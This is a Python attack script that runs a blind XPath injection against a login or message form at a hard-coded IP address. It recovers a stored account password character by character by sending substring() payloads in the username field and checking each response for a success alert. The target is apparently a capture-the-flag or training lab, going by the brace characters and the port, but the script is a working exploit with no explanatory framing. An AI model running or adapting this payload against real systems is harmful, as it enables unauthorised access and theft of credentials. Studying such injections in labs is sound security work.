import requests
import time
from requests.adapters import HTTPAdapter

url = "http://83.136.253.251:43217/index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://83.136.253.251:43217",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "close",
    "Referer": "http://83.136.253.251:43217/index.php",
    "Upgrade-Insecure-Requests": "1"
}

# Create a session object with connection pooling
session = requests.Session()
adapter = HTTPAdapter(pool_connections=5, pool_maxsize=20)
session.mount('http://', adapter)

# Length of the password
password_length = 37 

# Initialize the password
password = ''

# Iterate through each character in the password
for position in range(1, password_length + 1):
    # Iterate through alphanumeric characters
    for char in "{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        username_payload = f"invalid' or substring(/accounts/acc[1]/password,{position},1)='{char}' and '1'='1"
        data = {"username": username_payload, "msg": ''}

        try:
            response = session.post(url, headers=headers, data=data, timeout=10)  # Increase the timeout value as needed
            response.raise_for_status()  # Raise an error for bad responses

            # Check if the response contains the success message
            if '<script>alert("Message successfully sent!");</script>' in response.text:
                password += char
                print(f"Character at position {position}: {char}")
                break

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    # Add a short delay between requests
    time.sleep(0.1)

print(f"Found password: {password}")

##
##
